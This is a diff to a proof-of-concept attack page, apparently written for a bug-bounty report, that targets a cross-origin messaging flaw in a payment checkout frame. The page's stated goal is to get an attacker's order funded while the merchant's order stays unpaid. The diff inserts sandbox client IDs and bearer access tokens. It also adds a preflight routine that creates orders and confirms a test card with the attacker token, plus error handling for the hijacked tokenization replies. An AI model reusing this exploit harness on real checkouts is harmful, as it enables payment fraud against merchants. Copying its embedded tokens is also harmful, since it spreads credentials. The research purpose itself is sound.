@@ -32,16 +32,18 @@ sandbox merchants and researcher owned sandbox orders. No third party is involve
 <div class="grid">
   <div>
     <label>Attacker sandbox client ID</label><input id="cid" autocomplete="off" value="BAAZJk4mOoefN6A2YKUmdHRRlhYabTO5vRj1Zo4V35GtvNmqPuVB1r4vF1meT2cov1ob6FKyg4pqpadkLc">
-    <label>Attacker sandbox access token</label><input id="tok" autocomplete="off" value="A21AAKXSnJxhJkRZe1NO4IsakVh2iTxYUL11LeyPJZqJ7J3CaFgoD_unNwrwsM8NmCHTIIlbL_gIe6KpPif-qcwIbQcOt4CqA">
+    <label>Attacker sandbox access token</label><input id="tok" autocomplete="off" value="A21AAKvnzw3q6W3gAFiL5Va1vf_R6bTrd8g6-XXQ-Q1E01N5wF94pfURaPlVTRbeBtkgtFYf-nCOp0gjWZJkA5ki2ljdBJ4Uw">
   </div>
   <div>
-    <label>ATTACKER order ID (should end up funded)</label><input id="oid" autocomplete="off" value="2RE197667G919200W">
-    <label>MERCHANT order ID (should stay unpaid)</label><input id="moid" autocomplete="off" value="9UH89970P9068305D">
+    <label>ATTACKER order ID (should end up funded)</label><input id="oid" autocomplete="off" value="67D95118KX7819307">
+    <label>MERCHANT order ID (should stay unpaid)</label><input id="moid" autocomplete="off" value="5N677344J4077423J">
   </div>
 </div>
 
+<button id="precheck">1b. Check the ATTACKER account can take cards</button>
 <button id="open">2. Open merchant checkout</button>
 <button id="noopener">open with noopener (negative control)</button>
+<div id="precheck_out" class="mute" style="margin-top:8px">The attacker account is the one that tokenizes the card, so it must have Advanced Credit and Debit Card Payments enabled. Run this first.</div>
 
 <h2>3. Framebus traffic seen by this attacker page</h2>
 <pre id="log">ready.
@@ -121,8 +123,56 @@ window.addEventListener('message', (e) => {
 
   if (ev === 'attacker-tokenization-reply') {
     log('<< frame replied to the attacker origin: ' + JSON.stringify(p.args));
+    // The frame answers [[error, result]]. An error here is almost always the ATTACKER's own
+    // account, not the bug: the frame tokenizes with the attacker access token, so that account
+    // must be able to take cards. Spell it out instead of leaving a raw array on screen.
+    try {
+      const err = (p.args && p.args[0] && p.args[0][0]) || null;
+      const blob = JSON.stringify(err || '');
+      if (err) {
+        if (blob.indexOf('invalid_token') >= 0 || blob.indexOf('not found in cache') >= 0) {
+          log('!! The ATTACKER access token was rejected by PayPal, not the merchant one.');
+          log('!! That account cannot tokenize cards. Enable Advanced Credit and Debit Card');
+          log('!! Payments on it, or put an account that has it in the attacker fields.');
+          log('!! Run "1b. Check the ATTACKER account can take cards" to confirm which it is.');
+        } else {
+          log('!! The frame returned an error for the attacker tokenization: ' + blob);
+        }
+      }
+    } catch (_) {}
     setTimeout(refresh, 1200);
   }
+
+// Preflight: does the ATTACKER account actually accept cards? Creates one throwaway sandbox order
+// on that account and confirms the official test card against it. This is the exact call the
+// tokenization frame makes, so it reproduces the failure (or rules it out) in isolation.
+document.getElementById('precheck').addEventListener('click', async () => {
+  const out = document.getElementById('precheck_out');
+  const tokv = $('tok');
+  if (!tokv) { out.textContent = 'Put the attacker sandbox access token in the field above first.'; return; }
+  out.textContent = 'checking the attacker account...';
+  const hdr = { 'Authorization': 'Bearer ' + tokv, 'Content-Type': 'application/json' };
+  try {
+    const mk = await fetch(API + '/v2/checkout/orders', { method: 'POST', headers: Object.assign({ 'Prefer': 'return=representation' }, hdr),
+      body: JSON.stringify({ intent: 'CAPTURE', purchase_units: [{ amount: { currency_code: 'USD', value: '1.00' } }],
+        application_context: { shipping_preference: 'NO_SHIPPING' } }) });
+    const order = await mk.json();
+    if (!mk.ok || !order.id) { out.textContent = 'FAIL: the attacker token could not even create an order (HTTP ' + mk.status + '). ' + JSON.stringify(order).slice(0, 200); return; }
+    const cf = await fetch(API + '/v2/checkout/orders/' + order.id + '/confirm-payment-source', { method: 'POST', headers: hdr,
+      body: JSON.stringify({ payment_source: { card: { number: '4005519200000004', expiry: '2030-12', security_code: '123', name: 'Preflight Check' } } }) });
+    const res = await cf.json();
+    if (cf.ok && res.status) {
+      out.textContent = 'OK: attacker account accepts cards (order ' + order.id + ' -> ' + res.status + '). The PoC will work with these values.';
+      alog('precheck: attacker account OK, ' + order.id + ' -> ' + res.status);
+    } else {
+      out.textContent = 'FAIL: this attacker account cannot tokenize cards (HTTP ' + cf.status + '): ' + JSON.stringify(res).slice(0, 220)
+        + '  -> enable Advanced Credit and Debit Card Payments on it, or use a different account in the attacker fields.';
+      alog('precheck: attacker account REJECTED: ' + JSON.stringify(res).slice(0, 300));
+    }
+  } catch (e) {
+    out.textContent = 'precheck failed to run: ' + (e && e.message);
+  }
+});
 });
 
 document.getElementById('open').addEventListener('click', () => {
